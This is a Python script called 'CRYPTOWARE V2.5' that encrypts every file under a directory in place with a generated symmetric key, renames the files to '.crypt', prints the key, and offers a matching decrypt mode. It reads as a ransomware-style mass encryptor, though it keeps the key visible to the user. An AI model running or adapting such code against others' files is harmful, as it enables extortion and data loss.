#!/usr/bin/env python3
# CRYPTOWARE V2.5
# this version will encrypt all files and subfolders using symmetric encryption
# this is a command line function made for the terminal
# written by metr0 and openAI 
# 1-13-2023
import os
import time
import binascii
from cryptography.fernet import Fernet, InvalidToken, InvalidSignature
import argparse

# color text class
class ansi:
    RED = '\033[1;31m' 
    GREEN = '\033[1;32m' 
    BOLD = '\033[1m'
    CYAN = '\033[1;36m'
    END = '\033[0m'


##################################ENCRYPT FUNCTION###########################
# directory function
def encrypt_subfolders(key, dir_path):
    filecount = 0
    for dirpath, dirnames, filenames in os.walk(dir_path):
        for filename in filenames:
            if filename.endswith('.crypt') or filename == os.path.basename(__file__):
                continue
            if filename.endswith('.py') or filename == 'cryptoware2' or filename == 'decrypt2':
                continue
            file_path = os.path.join(dirpath, filename)
            encrypt_file(key, file_path)
            os.rename(file_path, file_path + '.crypt')
            #print(f'[  {ansi.GREEN}OK{ansi.END}  ]{file_path} has been encrypted')	
            filecount += 1
    print('[  FINISH  ] Encryption')
    print(f'\n{ansi.GREEN}[ {filecount} files has been encrypted ]{ansi.END}\n')


# encryption function
def encrypt_file(key, file_path):
    try:
        with open(file_path, 'rb') as f:
            contents = f.read()
        encrypted_contents = Fernet(key).encrypt(contents)
        with open(file_path, 'wb') as f:
            f.write(encrypted_contents)
        print(f'[  {ansi.GREEN}OK{ansi.END}  ] {file_path} has been encrypted')

    except (IOError, OSError):
        print(f'[  {ansi.RED}ERROR{ansi.END}  ] Unable to encrypt {file_path}')

############################DECRYPT FUNCTION#################################

def decrypt_subfolders(key, dir_path):
    filecount = 0
    for dirpath, dirnames, filenames in os.walk(dir_path):
        for filename in filenames:
            if not filename.endswith('.crypt'):
                continue
            file_path = os.path.join(dirpath, filename)
            decrypt_file(key, file_path)
            os.rename(file_path, file_path[:-6])
            #print(f'[  {ansi.GREEN}OK{ansi.END}  ]{file_path} has been decrypted')
            filecount += 1
    print('[  FINISH  ] Decryption')
    print(f'\n{ansi.GREEN}[ {filecount} files has been decrypted ]{ansi.END}\n') 


def decrypt_file(key, file_path):
    try:
        with open(file_path, 'rb') as f:
            contents = f.read()
        decrypted_contents = Fernet(key).decrypt(contents)
        with open(file_path, 'wb') as f:
            f.write(decrypted_contents)
            print(f'[  {ansi.GREEN}OK{ansi.END}  ] {file_path} has been decrypted')

    except (IOError, OSError):
        print(f'[  {ansi.RED}ERROR{ansi.END}  ] Unable to decrypt {file_path}')


def main():
    parser = argparse.ArgumentParser('./cryptoware2.py [yourdirectory]')
    parser.add_argument('path', help='path to directory')
    parser.add_argument('-e', '--encrypt', action='store_true', help='encrypts the folder')
    parser.add_argument('-d', '--decrypt', action='store_true', help='decrypts the folder')
    parser.add_argument('-k', '--key', nargs='?', help='key text')
    parser.add_argument('-K', '--keyfile', nargs='?', help='key file')
    args = parser.parse_args()
    dir_path = args.path


    # ---encrypt
    if args.encrypt:
        key = Fernet.generate_key()
        encrypt_subfolders(key, dir_path)
        print('-' * 66)
        print(f'[*] this is your key: {ansi.CYAN}{str(key)[2:-1]}{ansi.END}')
        print('-' * 66)
        exit() 

    # --decrypt
    if args.decrypt:

        try:
            if args.key:  #  --key
                key = bytes(args.key, 'utf-8')
            elif args.keyfile:  # if --Keyfile
                with open(args.keyfile, 'rb') as f:
                    key = f.read()
            else:
                raise ValueError("No key or keyfile provided.")
            decrypt_subfolders(key, dir_path)
        except (InvalidToken, InvalidSignature, binascii.Error, ValueError) as e:
            print(f'\n[!] {e}')
        except FileNotFoundError as e:
            print(f'\n[!] {e}')

    else:
        parser.print_help() 


if __name__ == "__main__":
    main()   